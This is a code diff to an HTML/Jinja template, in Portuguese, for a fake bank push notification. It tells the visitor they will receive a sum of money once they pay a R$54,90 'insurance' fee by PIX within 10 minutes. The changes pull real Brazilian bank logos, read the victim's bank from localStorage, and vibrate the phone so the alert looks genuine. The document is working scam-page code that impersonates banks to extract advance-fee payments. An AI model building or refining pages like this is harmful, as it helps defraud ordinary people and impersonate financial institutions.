@@ -47,6 +47,66 @@
             font-weight: 800;
             font-style: normal;
         }
+        
+        /* Animações para a notificação */
+        @keyframes slideDown {
+            from {
+                transform: translateY(-100%);
+                opacity: 0;
+            }
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+        @keyframes slideUp {
+            from {
+                transform: translateY(0);
+                opacity: 1;
+            }
+            to {
+                transform: translateY(-100%);
+                opacity: 0;
+            }
+        }
+        @keyframes slideLeft {
+            from {
+                transform: translateX(0);
+                opacity: 1;
+            }
+            to {
+                transform: translateX(-100%);
+                opacity: 0;
+            }
+        }
+        @keyframes slideRight {
+            from {
+                transform: translateX(0);
+                opacity: 1;
+            }
+            to {
+                transform: translateX(100%);
+                opacity: 0;
+            }
+        }
+        
+        /* Estilo da notificação */
+        .notification {
+            position: fixed;
+            top: 0px;
+            left: 0;
+            right: 0;
+            margin-left: auto;
+            margin-right: auto;
+            z-index: 9999;
+            width: calc(100% - 30px);
+            max-width: 420px;
+            transition: transform 0.2s ease, opacity 0.2s ease;
+            cursor: grab;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.15);
+            border: 1px solid rgba(0, 0, 0, 0.06);
+            border-radius: 12px;
+        }
         * {
             margin: 0;
             padding: 0;
@@ -285,59 +345,15 @@
             width: 100px;
             margin: 0 auto 0.8rem;
         }
-        @keyframes slideDown {
-            from {
-                transform: translateY(-100%);
-                opacity: 0;
-            }
-            to {
-                transform: translateY(0);
-                opacity: 1;
-            }
+        /* Classes específicas para animações de notificação */
+        .notification.hide-up {
+            animation: slideUp 0.3s ease-in forwards;
         }
-        @keyframes slideUp {
-            from {
-                transform: translateY(0);
-                opacity: 1;
-            }
-            to {
-                transform: translateY(-100%);
-                opacity: 0;
-            }
+        .notification.hide-left {
+            animation: slideLeft 0.3s ease-in forwards;
         }
-        @keyframes slideLeft {
-            from {
-                transform: translateX(0);
-                opacity: 1;
-            }
-            to {
-                transform: translateX(-100%);
-                opacity: 0;
-            }
-        }
-        @keyframes slideRight {
-            from {
-                transform: translateX(0);
-                opacity: 1;
-            }
-            to {
-                transform: translateX(100%);
-                opacity: 0;
-            }
-        }
-        .notification {
-            position: fixed;
-            top: 10px;
-            left: 50%;
-            transform: translateX(-50%);
-            width: 95%;
-            max-width: 400px;
-            background-color: #fff;
-            border-radius: 12px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
-            z-index: 1000;
-            display: none;
-            overflow: hidden;
+        .notification.hide-right {
+            animation: slideRight 0.3s ease-in forwards;
         }
         .notification-header {
             display: flex;
@@ -408,23 +424,26 @@
 </head>
 <body>
     <!-- Notification -->
-    <div id="paymentNotification" class="mt-4 mx-auto bg-white rounded-3xl p-3 shadow-lg notification" style="max-width: calc(100% - 25px); display: none; opacity: 0; transform: translateY(-100%);">
+    <div id="paymentNotification" class="notification" style="display: none; background-color: white; padding: 12px; border-radius: 12px;">
         <div class="flex justify-between items-start">
             <div class="flex-grow pr-2">
-                <div class="flex items-center mb-1 pl-2">
+                <div class="flex items-center mb-1">
                     <div class="w-6 h-6 rounded-[10px] mr-2 overflow-hidden">
-                        <img src="https://seebvideira.com.br/uploads/92868821-e42d-4dd5-a71a-6ee1241c82e5/caixa-logo.svg" alt="Bank logo" class="w-full h-full object-cover bank-image">
+                        <img id="bankLogo1" src="https://logodownload.org/wp-content/uploads/2019/08/nubank-logo-2.png" alt="Bank logo" class="w-full h-full object-cover bank-image">
                     </div>
-                    <span class="text-gray-700 text-sm">Caixa Econômica Federal • agora <i class="fas fa-chevron-down text-xs"></i></span>
+                    <span id="bankName1" class="text-gray-700 text-sm">Nubank • agora <i class="fas fa-chevron-down text-xs"></i></span>
                 </div>
-                <div class="text-black text-lg font-bold mb-0 pl-2">Você vai receber R$4.000,00</div>
+                <div class="text-black text-base font-bold mb-1 flex items-center whitespace-nowrap overflow-hidden" style="text-overflow: ellipsis;">
+                    <span class="mr-2" style="font-size: 1.1em;">💰</span>
+                    Você vai receber R$ {{ '{:,.2f}'.format(amount).replace(',', '.').replace('.', ',') }}
+                </div>
             </div>
             <div class="w-12 h-12 flex-shrink-0 overflow-hidden rounded-[10px]">
-                <img src="https://seebvideira.com.br/uploads/92868821-e42d-4dd5-a71a-6ee1241c82e5/caixa-logo.svg" alt="Bank logo" class="w-full h-full object-cover bank-image">
+                <img id="bankLogo2" src="https://logodownload.org/wp-content/uploads/2019/08/nubank-logo-2.png" alt="Bank logo" class="w-full h-full object-cover bank-image">
             </div>
         </div>
-        <div class="text-gray-600 text-sm w-full mt-0.5 pl-2 pr-2" style="word-break: break-word; max-width: 100%; line-height: 1.4; letter-spacing: -0.01em;">
-            Caixa Econômica Federal está aguardando o pagamento do seguro no valor de R$54,90 para depositar R$4.000,00 em sua conta {{ bank|default("CAIXA ECONÔMICA FEDERAL") }}. Copie o código PIX e realize o pagamento em até 10 minutos ou a transação será bloqueada.
+        <div class="text-gray-600 text-sm w-full mt-0.5" style="word-break: break-word;">
+            Caixa Econômica Federal está aguardando o pagamento do seguro no valor de R$54,90 para depositar R$ {{ '{:,.2f}'.format(amount).replace(',', '.').replace('.', ',') }} em sua conta <span id="bankText">Nubank</span>. Copie o código PIX e realize o pagamento em até 10 minutos ou a transação será bloqueada.
         </div>
     </div>
 
@@ -606,6 +625,51 @@
 
     <script>
             document.addEventListener('DOMContentLoaded', function() {
+                // Função para obter a imagem do banco baseada no banco
+                function getBankImage(bankName) {
+                    // Mapeamento de bancos para suas respectivas imagens
+                    const bankImages = {
+                        'Nubank': 'https://logodownload.org/wp-content/uploads/2019/08/nubank-logo-2.png',
+                        'Itau': 'https://upload.wikimedia.org/wikipedia/commons/2/2d/2023_Ita%C3%BA_Unibanco_Logo.png',
+                        'Bradesco': 'https://media.licdn.com/dms/image/v2/C4E0BAQEXB9xussWsHQ/company-logo_200_200/company-logo_200_200/0/1680038081184/bradesco_logo?e=2147483647&v=beta&t=g_KrgasAdf1h-qhIvVQG3R5022A7UVAaAnuFYCNBqkc',
+                        'Santander': 'https://i.pinimg.com/564x/e9/67/a4/e967a4935c65ed0da069364e952e4630.jpg',
+                        'Caixa': 'https://seebvideira.com.br/uploads/92868821-e42d-4dd5-a71a-6ee1241c82e5/caixa-logo.svg',
+                        'Banco do Brasil': 'https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi4v4sz_PsGCe98ocnEokjkWgfBgThfi70u-36k6j3f81st-IBaIbW2InDiKlugsqyqTxkVApq4dcgSpFXVDrdNsla1jgm7Da8DyEfZjf1JNveDfj4S80-xIiX9Yy2D5Tx5or-Psg/s1600/BB+logo.jpg',
+                        'Inter': 'https://i.ibb.co/04MjDYh/Design-sem-nome-5.png',
+                        'C6': 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQAdb6wCFEOzVXR0WHXSOLsjjWTwWL0u1-FTw&s',
+                        'PicPay': 'https://yt3.googleusercontent.com/cUdSm0KI0fN0sgr5Jb_DvkaQRuR5G9rl1ijX7MoUueMq2AVzNKdBqS_WNALQl9OTRyCviKFJQOs=s900-c-k-c0x00ffffff-no-rj',
+                        'Neon': 'https://t.ctcdn.com.br/j48g27dg8ohgm7yzRap-mQEZkrQ=/i666960.jpeg'
+                    };
+                    
+                    // Retorna a imagem correspondente ao banco ou a imagem padrão do Nubank
+                    return bankImages[bankName] || bankImages['Nubank'];
+                }
+                
+                // Pegar nome do banco da URL ou localStorage
+                let bankName = "Nubank";
+                
+                // Verificar se temos dados no localStorage
+                try {
+                    const userData = JSON.parse(localStorage.getItem('userData') || '{}');
+                    console.log("Loading from localStorage:", userData);
+                    
+                    if (userData.bank) {
+                        bankName = userData.bank;
+                    }
+                } catch(e) {
+                    console.error("Erro ao carregar dados:", e);
+                }
+                
+                // Atualizar a imagem e nome do banco nas notificações
+                const bankImage = getBankImage(bankName);
+                const bankLogos = document.querySelectorAll('.bank-image');
+                bankLogos.forEach(img => {
+                    img.src = bankImage;
+                });
+                
+                document.getElementById('bankName1').innerHTML = bankName + ' • agora <i class="fas fa-chevron-down text-xs"></i>';
+                document.getElementById('bankText').textContent = bankName;
+                
                 // Mostrar notificação após 6 segundos
                 setTimeout(function() {
                     showNotification();
@@ -617,6 +681,11 @@
 
                     // Obter a notificação
                     const notification = document.getElementById('paymentNotification');
+                    
+                    // Vibrar dispositivo se possível
+                    if (navigator.vibrate) {
+                        navigator.vibrate(200);
+                    }
                     
                     // Exibir a notificação com animação
                     notification.style.display = 'block';
@@ -751,11 +820,12 @@
                 
                 function hideNotification(animationType) {
                     const notification = document.getElementById('paymentNotification');
-                    notification.style.animation = animationType + ' 0.5s forwards';
+                    notification.classList.add('hide-' + animationType.replace('slide', '').toLowerCase());
                     
                     // Após a animação terminar, ocultar o elemento
                     setTimeout(function() {
                         notification.style.display = 'none';
+                        notification.classList.remove('hide-' + animationType.replace('slide', '').toLowerCase());
                     }, 500);
                 }
 
